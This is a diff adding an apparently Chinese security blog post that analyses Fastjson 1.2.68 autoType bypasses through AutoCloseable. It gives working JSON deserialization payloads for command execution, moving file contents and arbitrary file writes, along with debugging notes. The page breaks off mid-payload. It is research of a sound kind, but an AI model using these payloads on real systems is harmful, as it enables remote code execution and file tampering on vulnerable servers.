@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Fastjson 1.2.68 读写文件 &amp; MySQL JDBC &amp; 依赖探测Trick 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/notebook/">
+          <a href="/notebook/">学习笔记</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Fastjson 1.2.68 读写文件 & MySQL JDBC & 依赖探测Trick</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-01-15 17:13:05
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="Fastjson-1-2-68-读写文件-MySQL-JDBC-依赖探测Trick"><a href="#Fastjson-1-2-68-读写文件-MySQL-JDBC-依赖探测Trick" class="headerlink" title="Fastjson 1.2.68 读写文件 &amp; MySQL JDBC &amp; 依赖探测Trick"></a>Fastjson 1.2.68 读写文件 &amp; MySQL JDBC &amp; 依赖探测Trick</h1><h3 id="bypass-autoType"><a href="#bypass-autoType" class="headerlink" title="bypass autoType"></a>bypass autoType</h3><p>想要绕过<code>fastjson checkAutoType</code>，首先看在哪些条件下可以<code>return clazz</code>​</p>
+<p>​<code>1.2.68</code>的利用链都是围绕<code>AutoClosable</code>的，所以直接从<code>AutoClosable</code>的利用链分析</p>
+<p>​<code>EvilAutoClosable.java</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilAutoClosable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<code>Demo EXP</code>​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.kagty1.fastjsonhighversion.demos.web.EvilAutoClosable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;open -a Calculator&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<code>java.lang.AutoCloseable</code>在<code>mapping</code>中，直接通过<code>checkAutotype</code>检测</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114214311-qy42d7r.png" alt="image"></p>
+<p>‍</p>
+<p>获取反序列化器<code>JavaBeanDeserializer</code>，调用<code>JavaBeanDeserializer#deserialze</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114214449-ff9eabg.png" alt="image"></p>
+<p>‍</p>
+<p>走到第二个<code>@type</code>的<code>checkAutoType</code>检测，这里传入了<code>expectClass</code>，为<code>java.lang.AutoClosable</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114214853-vvtenbw.png" alt="image"></p>
+<p>致使<code>expectClass</code>的值被设置为<code>true</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114215015-1tp16rg.png" alt="image"></p>
+<p>进入下面的<code>if</code>逻辑，加载第二个<code>@type</code>指定的类赋值予<code>clazz</code>，若<code>expectClass</code>不为空且<code>clazz</code>为<code>expectClass</code>子类，则直接返回<code>clazz</code>，实现绕过</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114215203-p5mbry9.png" alt="image"></p>
+<p>最后就是正常的逻辑，调用<code>setter</code>实现命令执行</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114215638-u6d5cak.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h4 id="SafeFileOutputStream"><a href="#SafeFileOutputStream" class="headerlink" title="SafeFileOutputStream"></a>SafeFileOutputStream</h4><p>​<code>AspectJ</code>依赖中的<code>SafeFileOutputStream</code>类实现了<code>AutoCloseable</code>接口</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114221912-h2uvgu9.png" alt="image"></p>
+<p>有参构造函数可以实现文件内容移动，原文件内容会被滞空</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114222224-nf5yqf6.png" alt="image"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;targetPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/xxx/xxx/xxx.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tempPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于会破坏原文件内容，所以比较鸡肋，可以作为一个<code>trick</code>来用</p>
+<p>‍</p>
+<h3 id="任意文件写"><a href="#任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h3><h4 id="MarshalOutputStream"><a href="#MarshalOutputStream" class="headerlink" title="MarshalOutputStream"></a>MarshalOutputStream</h4><p>​<code>JDK</code>原生类</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/evil.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;array&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limit&quot;</span><span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span> <span class="number">1048576</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>不通用，可能报错：<code>default constructor not found. class sun.rmi.server.MarshalOutputStream</code>​</p>
+<p>报错原因：</p>
+<p>​<code>fastjson</code>用带参构造函数来实例化对象，要求构造函数的参数名必须可读</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -l &lt;class_name&gt; | grep LocalVariableTable</span><br></pre></td></tr></table></figure>
+
+<p>若输出有局部变量表<code>LocalVariavleTable</code>，说明该类的字节码里保留了参数名</p>
+<p>以<code>User</code>类为例</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115103046-74vhj4k.png" alt="image"></p>
+<p>‍</p>
+<h4 id="XmlStreamReader-修改decoder为null造成的空指针问题"><a href="#XmlStreamReader-修改decoder为null造成的空指针问题" class="headerlink" title="XmlStreamReader &amp;&amp; 修改decoder为null造成的空指针问题"></a>XmlStreamReader &amp;&amp; 修改decoder为null造成的空指针问题</h4><p>原理参考 - <code>https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</code>​</p>
+<p>公开<code>EXP</code>在不同环境中存在一些问题</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>不知为何，没有预期走<code>charsetName</code>的那个构造函数，导致<code>decoder</code>的值为<code>null</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115130359-wrodyzp.png" alt="image"></p>
+<p>从而在调用过程中出现空指针错误，导致利用失败</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115130537-mxzg0jd.png" alt="image"></p>
+<p>可以直接将<code>charsetName</code>换成<code>deocoder</code> –&gt; <code>&quot;decoder&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;&#125;,</code>，解决问题</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115130809-xdpscfu.png" alt="image"></p>
+<p>‍</p>
+<p>完整<code>EXP</code>，写入前8192个字符</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;kagty1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa